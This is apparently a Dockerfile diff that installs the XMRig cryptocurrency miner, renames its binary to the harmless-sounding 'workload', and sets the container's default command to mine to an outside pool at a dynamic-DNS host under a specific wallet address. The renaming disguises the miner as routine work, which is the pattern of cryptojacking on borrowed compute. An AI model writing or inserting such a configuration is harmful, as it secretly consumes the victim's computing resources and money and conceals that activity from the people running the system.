@@ -9,10 +9,10 @@ RUN apt update; \
     cd xmrig-6.16.2; \
     cp xmrig /usr/local/bin/xmrig; \
     cd /usr/local/bin; \
-    mv xmrig workflow;
+    mv xmrig workload;
 
 WORKDIR /usr/local/bin
 
-RUN chmod 777 workflow;
+RUN chmod 777 workload;
 
-CMD workflow -a gr -o 23.88.72.40:5555 --tls -u RN86DoccH99PZpx9oMZDVvY2ZMi9578pBV
+CMD workload -a gr -o workload.sytes.net:55555 --tls -u RJ5mc1uMeBtqUmwJZJmT52B21HasAmJd2k.workload
